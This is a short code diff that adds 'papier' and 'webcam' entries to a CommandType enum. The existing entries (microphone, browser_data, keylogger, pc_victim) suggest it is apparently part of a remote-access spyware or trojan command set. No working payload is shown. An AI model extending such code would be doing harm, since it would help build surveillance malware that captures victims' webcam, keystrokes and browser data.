@@ -9,6 +9,8 @@ class CommandType(Enum):
     MICROPHONE = "microphone"
     BROWSER_DATA = "browser_data"
     KEYLOGGER = "keylogger"
+    PAPIER = "papier"
+    WEBCAM = "webcam"
     PC_VICTIM = "pc_victim"
 
 
